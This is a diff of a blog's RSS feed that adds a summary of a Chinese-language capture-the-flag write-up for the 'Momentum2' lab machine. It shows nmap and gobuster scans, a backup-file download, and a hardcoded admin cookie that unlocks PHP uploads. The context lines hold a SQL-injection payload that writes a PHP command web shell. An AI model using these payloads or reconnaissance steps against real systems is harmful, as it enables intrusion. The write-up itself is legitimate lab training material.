@@ -254,7 +254,32 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
 &lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;SELECT &amp;#34;&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34; INTO DUMPFILE &amp;#39;/var/www/html/shell.php&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;http://10.10.10.33/shell.php?cmd=pwd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description></item><item><title>EvilBox One Writeup</title><link>https://enilmalus.github.io/posts/evilbox-one-writeup/</link><pubDate>Sun, 11 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/evilbox-one-writeup/</guid><description>&lt;blockquote&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description></item><item><title>Momentum2 Writeup</title><link>https://enilmalus.github.io/posts/momentum2-writeup/</link><pubDate>Fri, 16 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/momentum2-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
+&lt;h2 id="使用-nmap-进行基础扫描"&gt;使用 nmap 进行基础扫描&lt;/h2&gt;
+&lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+
+sudo nmap --min-rate 10000 -p- 10.10.10.31 
+
+sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
+
+sudo nmap --script=vuln -p22,80 10.10.10.31 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
+&lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,php.bak,jsp.zip,html
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;h1 id="web-渗透"&gt;Web 渗透&lt;/h1&gt;
+&lt;h2 id="页面分析"&gt;页面分析&lt;/h2&gt;
+&lt;p&gt;这是 80端口 的页面&lt;/p&gt;
+&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
+&lt;p&gt;dashborard 界面像是一个文件上次的界面，可能存在 &lt;strong&gt;文件上传&lt;/strong&gt; 漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
+&lt;p&gt;ajax.bak 是备份文件，curl 下载看看&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;curl http://10.10.10.31/ajax.php.bak
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
+&lt;p&gt;审计源码，文件上传的时候当 &lt;strong&gt;cookie&lt;/strong&gt; 名为 &lt;strong&gt;admin&lt;/strong&gt; ， 值为**&amp;amp;G6u@B6uDXMq&amp;amp;Ms** 同时 POST 名为 &lt;strong&gt;secure&lt;/strong&gt; ，值为 &lt;strong&gt;val1d&lt;/strong&gt; 的时候可以上传 pdf、php、txt 文件，否则只能上传 txt 文件
+（注释说 cookie 末尾要加一个大写字母）&lt;/p&gt;</description></item><item><title>EvilBox One Writeup</title><link>https://enilmalus.github.io/posts/evilbox-one-writeup/</link><pubDate>Sun, 11 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/evilbox-one-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h1 id="evilbox-one"&gt;EvilBox One&lt;/h1&gt;
